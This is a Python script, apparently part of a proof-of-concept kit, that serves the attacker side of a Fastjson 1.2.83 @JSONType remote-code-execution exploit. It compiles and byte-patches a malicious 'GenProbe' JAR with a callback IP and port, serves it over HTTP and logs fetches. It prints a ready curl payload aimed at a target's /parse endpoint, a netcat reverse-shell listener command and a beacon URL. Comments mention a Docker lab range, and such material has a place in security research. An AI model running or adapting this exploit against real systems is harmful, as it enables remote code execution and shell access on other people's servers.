#!/usr/bin/env python3
"""
Fastjson 1.2.83 @JSONType RCE - 恶意 JAR 文件 HTTP 服务器

用法:
    python3 serve.py [--port PORT] [--dir DIRECTORY] [--cb-host HOST] [--cb-port PORT]

默认在 0.0.0.0:19090 上监听，提供当前目录下的 probe。

回调 IP 默认 127.0.0.1:4444，可通过 --cb-host 和 --cb-port 修改（自动重编译）。

配合 payload:
    {"@type":"jar:http:..<INT_IP>:19090.probe!.GenProbe"}

其中 <INT_IP> 是攻击者 IP 的整数形式。
例如 127.0.0.1 = 2130706433, 192.168.1.100 = 3232235876。
"""

import argparse
import http.server
import logging
import os
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
import urllib.request

def get_local_ip() -> str:
    """获取本机非回环 IPv4 地址"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0.1)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        pass
    try:
        import subprocess
        result = subprocess.run(
            ["ifconfig"], capture_output=True, text=True, timeout=3
        )
        for line in result.stdout.split("\n"):
            if "inet " in line and "127.0.0.1" not in line:
                parts = line.strip().split()
                for i, p in enumerate(parts):
                    if p == "inet":
                        return parts[i + 1]
    except Exception:
        pass
    return "127.0.0.1"

def get_all_ips() -> list:
    """获取本机所有非回环 IPv4 地址"""
    ips = []
    try:
        import subprocess
        result = subprocess.run(
            ["ifconfig"], capture_output=True, text=True, timeout=3
        )
        for line in result.stdout.split("\n"):
            if "inet " in line:
                parts = line.strip().split()
                for i, p in enumerate(parts):
                    if p == "inet" and parts[i + 1] != "127.0.0.1":
                        ips.append(parts[i + 1])
    except Exception:
        pass
    return ips

def ip_to_int(ip: str) -> int:
    """将点分十进制 IP 转换为整数"""
    return struct.unpack("!I", socket.inet_aton(ip))[0]

def int_to_ip(n: int) -> str:
    """将整数 IP 转换为点分十进制"""
    return socket.inet_ntoa(struct.pack("!I", n))

def is_ipv4(value: str) -> bool:
    try:
        socket.inet_aton(value)
        return value.count(".") == 3
    except OSError:
        return False

def find_java_tool(name: str) -> str:
    """查找可执行的 Java 工具，避开 macOS /usr/bin/java 启动桩。"""
    candidates = []
    java_home = os.environ.get("JAVA_HOME")
    if java_home:
        candidates.append(os.path.join(java_home, "bin", name))
    found = shutil.which(name)
    if found:
        candidates.append(found)
    candidates.extend([
        f"/opt/homebrew/opt/openjdk/bin/{name}",
        f"/usr/local/opt/openjdk/bin/{name}",
    ])
    for candidate in candidates:
        if not candidate or not os.path.exists(candidate):
            continue
        try:
            if name == "jar":
                # JDK 8 的 jar 不支持 --version；能输出用法即可说明工具可执行。
                result = subprocess.run([candidate], capture_output=True, text=True)
                output = (result.stdout or "") + (result.stderr or "")
                if "Usage:" in output or "用法:" in output or "jar" in output:
                    return candidate
                continue
            subprocess.run([candidate, "-version"], capture_output=True, check=True)
            return candidate
        except (FileNotFoundError, subprocess.CalledProcessError):
            continue
    return ""

def patch_class_utf8(data: bytes, replacements: dict) -> bytes:
    """替换 class 常量池中的 CONSTANT_Utf8 字符串。"""
    pos = 8
    cp_count = struct.unpack(">H", data[pos:pos + 2])[0]
    pos += 2

    entries = []
    i = 1
    while i < cp_count:
        tag = data[pos]
        entry_pos = pos
        if tag == 1:
            length = struct.unpack(">H", data[pos + 1:pos + 3])[0]
            pos += 3 + length
        elif tag in (3, 4):
            pos += 5
        elif tag in (5, 6):
            pos += 9
            i += 1
        elif tag in (7, 8, 16, 19, 20):
            pos += 3
        elif tag in (9, 10, 11, 12, 17, 18):
            pos += 5
        elif tag == 15:
            pos += 4
        else:
            raise ValueError(f"Unknown constant pool tag {tag} at position {pos}")
        entries.append((entry_pos, tag, pos))
        i += 1

    result = bytearray(data[:10])
    changed = set()
    for entry_pos, tag, entry_end in entries:
        if tag == 1:
            length = struct.unpack(">H", data[entry_pos + 1:entry_pos + 3])[0]
            start = entry_pos + 3
            value = data[start:start + length].decode("utf-8", errors="ignore")
            if value in replacements:
                new_value = replacements[value].encode("utf-8")
                result.append(tag)
                result.extend(struct.pack(">H", len(new_value)))
                result.extend(new_value)
                changed.add(value)
                continue
        result.extend(data[entry_pos:entry_end])

    missing = set(replacements) - changed
    if missing:
        raise ValueError(f"Could not find class constants: {sorted(missing)}")

    result.extend(data[pos:])
    return bytes(result)

def patch_sipush_short(data: bytes, old_value: int, new_value: int) -> bytes:
    """替换 class 字节码中的 sipush short 常量，用于修补默认回调端口。"""
    if old_value == new_value:
        return data
    if not 0 <= new_value <= 32767:
        raise ValueError("cb_port must be in 0..32767")
    old = b"\x11" + struct.pack(">h", old_value)
    new = b"\x11" + struct.pack(">h", new_value)
    if old not in data:
        raise ValueError(f"Could not find sipush {old_value}")
    return data.replace(old, new, 1)

def run_quiet(cmd: list, verbose: bool = False, cwd: str = None) -> None:
    """默认静默执行命令；失败时输出 stdout/stderr 便于定位。"""
    if verbose:
        subprocess.run(cmd, cwd=cwd, check=True)
        return
    result = subprocess.run(cmd, cwd=cwd, capture_output=True, text=True)
    if result.returncode != 0:
        if result.stdout:
            print(result.stdout, end="")
        if result.stderr:
            print(result.stderr, end="", file=sys.stderr)
        raise subprocess.CalledProcessError(result.returncode, cmd)

class LoggingHandler(http.server.SimpleHTTPRequestHandler):
    """带日志的 HTTP 请求处理器"""
    def log_message(self, format, *args):
        client_ip = self.client_address[0]
        logging.info("客户端 %s: %s", client_ip, format % args)

    def do_GET(self):
        client_ip = self.client_address[0]
        logging.info("收到请求: client=%s path=%s", client_ip, self.path)
        # 记录请求头信息，用于调试
        for k, v in self.headers.items():
            logging.debug("  %s: %s", k, v)
        super().do_GET()

def build_probe(cb_host: str, cb_port: int, http_port: int, work_dir: str,
                payload_host: str = "", force_build: bool = False,
                verbose: bool = False) -> str:
    """
    编译并打包 GenProbe.java，返回 probe JAR 路径。
    默认回调使用已有 probe；自定义回调时强制重编译，避免复用旧字节码。
    """
    work_dir = os.path.abspath(work_dir)
    probe_path = os.path.join(work_dir, "probe")
    if not payload_host:
        payload_host = str(ip_to_int(cb_host)) if is_ipv4(cb_host) else cb_host
    payload_type = f"jar:http:..{payload_host}:{http_port}.probe!.GenProbe"
    patched_internal_name = payload_type.replace(".", "/")
    default_callback = cb_host == "127.0.0.1" and cb_port == 4444

    # 默认回调优先使用已有的 probe 文件（避免本地无 JDK 时编译失败）
    if default_callback and os.path.exists(probe_path) and not force_build:
        if verbose:
            print(f"[*] 使用已有的 probe（回调 {cb_host}:{cb_port}）")
        return probe_path

    # 自定义回调必须重编译，否则 probe 内仍是旧 IP/端口。
    src_path = os.path.join(work_dir, "GenProbe.java")
    if verbose:
        print(f"[*] 编译 probe（回调 {cb_host}:{cb_port}）...")

    javac = find_java_tool("javac")
    jar = find_java_tool("jar")
    if not javac or not jar:
        print("[!] 未找到 javac，请安装 JDK")
        print("[!] macOS 的 /usr/bin/java 是启动桩，不代表已安装 JDK")
        print("[!] 可通过 brew install openjdk 安装，或使用 GitHub Actions 生成 poc/probe")
        sys.exit(1)

    # 检查 fastjson JAR
    fastjson_jar = os.path.join(work_dir, "fastjson-1.2.83.jar")
    if not os.path.exists(fastjson_jar):
        print("[*] 下载 fastjson-1.2.83.jar...")
        url = "https://repo1.maven.org/maven2/com/alibaba/fastjson/1.2.83/fastjson-1.2.83.jar"
        urllib.request.urlretrieve(url, fastjson_jar)

    # 直接编译原始源码，再修补 class 常量池。避免 macOS 拒绝 JDK 读取 Python 生成的临时源码。
    with tempfile.TemporaryDirectory(prefix=".build_probe_tmp_", dir=work_dir) as tmpdir:
        run_quiet([
            javac, "-source", "8", "-target", "8", "-cp", fastjson_jar, "-d", tmpdir, src_path
        ], verbose=verbose)

        # 创建 JAR（entry: GenProbe.class，带 .class 后缀，匹配 Fastjson 的 .class 后缀）
        class_file = os.path.join(tmpdir, "com/alibaba/fastjson/poc/GenProbe.class")
        if not os.path.exists(class_file):
            # 可能 javac 直接输出到 tmpdir 根目录
            class_file = os.path.join(tmpdir, "GenProbe.class")
        class_dir = os.path.dirname(class_file)

        with open(class_file, "rb") as f:
            class_data = f.read()
        class_data = patch_class_utf8(class_data, {
            "com/alibaba/fastjson/poc/GenProbe": patched_internal_name,
            "127.0.0.1": cb_host,
            "http://127.0.0.1:19090/beacon": f"http://{cb_host}:{http_port}/beacon",
        })
        class_data = patch_sipush_short(class_data, 4444, cb_port)

        # 写到临时目录根目录，用 GenProbe.class 名称创建 entry
        entry_src = os.path.join(class_dir, "GenProbe.class")
        with open(entry_src, "wb") as f:
            f.write(class_data)
        run_quiet([jar, "cf", probe_path, "GenProbe.class"], verbose=verbose, cwd=class_dir)

    if verbose:
        print(f"[+] 编译完成: {probe_path}")
        print(f"[*] 匹配 payload @type: {payload_type}")
    return probe_path

def main():
    parser = argparse.ArgumentParser(description="Fastjson RCE JAR 服务器")
    parser.add_argument("--port", type=int, default=19090,
                       help="监听端口 (默认: 19090)")
    parser.add_argument("--dir", type=str, default=".",
                       help="提供文件的目录 (默认: 当前目录)")
    parser.add_argument("--bind", type=str, default="0.0.0.0",
                       help="绑定地址 (默认: 0.0.0.0)")
    parser.add_argument("--ip", type=str,
                       help="显示本机 IP 的整数形式（不启动服务器）")
    parser.add_argument("--cb-host", type=str, default="127.0.0.1",
                       help="回调 IP 地址（默认: 127.0.0.1，自动重编译）")
    parser.add_argument("--cb-port", type=int, default=4444,
                       help="回调端口（默认: 4444，自动重编译）")
    parser.add_argument("--payload-host", type=str,
                       help="payload 中使用的 host 标识（默认: cb-host 的整数 IP 形式）")
    parser.add_argument("--build-only", action="store_true",
                       help="只构建 probe，不启动 HTTP 服务器")
    parser.add_argument("--force-build", action="store_true",
                       help="强制重新构建 probe，即使已有 probe 文件")
    parser.add_argument("--verbose", action="store_true",
                       help="显示编译细节和 javac/jar 输出")
    args = parser.parse_args()

    if args.ip:
        n = ip_to_int(args.ip)
        print(f"IP {args.ip}")
        print(f"  Java URL 可用形式: {n}")
        print(f"验证: {int_to_ip(n)}")
        return

    # 编译 probe（如果回调地址与默认不同）
    work_dir = os.path.abspath(args.dir)
    payload_host = args.payload_host or (str(ip_to_int(args.cb_host)) if is_ipv4(args.cb_host) else args.cb_host)
    probe_path = build_probe(
        args.cb_host, args.cb_port, args.port, work_dir, payload_host,
        args.force_build, args.verbose
    )
    if args.build_only:
        return

    # 配置日志
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%H:%M:%S",
    )

    os.chdir(args.dir)
    server = http.server.HTTPServer(
        (args.bind, args.port),
        LoggingHandler,
    )

    # 显示本机所有 IP 的整数形式
    all_ips = get_all_ips()
    local_ip = get_local_ip()

    print(f"[*] 服务器启动: http://{args.bind}:{args.port}")
    print(f"[*] 反弹 shell: {args.cb_host}:{args.cb_port} (macOS: while true; do nc -l -v {args.cb_port}; done)")
    print(f"[*] beacon 回调: http://{args.cb_host}:{args.port}/beacon")
    print(f"[*] Payload 可用本机地址（非请求日志）:")
    print(f"      {'IP':15} {'Java URL 可用形式'}")
    for ip in all_ips:
        mark = " <- 自动选择的 IP" if ip == local_ip else ""
        print(f"      {ip:15} {ip_to_int(ip)}{mark}")
    loopback = "127.0.0.1"
    print(f"      {loopback:15} {ip_to_int(loopback)} (仅宿主机本地)")
    print()
    print(f"    [!] 注意: 靶场在 Docker 容器中时，容器内的 127.0.0.1 指向容器自身！")
    print(f"    [!] 请使用宿主机 LAN IP (如 {local_ip if all_ips else '192.168.1.100'}) 的十进制整数形式")
    print(f"    [!] URL 百分号编码不适合该向量；可用单标签主机名（如 attacker）替代数字 IP")
    print(f"    [!] 可使用 --ip 参数手动计算: python3 serve.py --ip <your-ip>")
    print()
    print(f"    Payload 示例 (宿主机 LAN IP):")
    print(f"      curl -X POST -H 'Content-Type: application/json' \\")
    print(f"        --data '{{\"@type\":\"jar:http:..{payload_host}:{args.port}.probe!.GenProbe\"}}' \\")
    print(f"        http://target:18080/parse")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 服务器已停止")
        server.server_close()

if __name__ == "__main__":
    main()
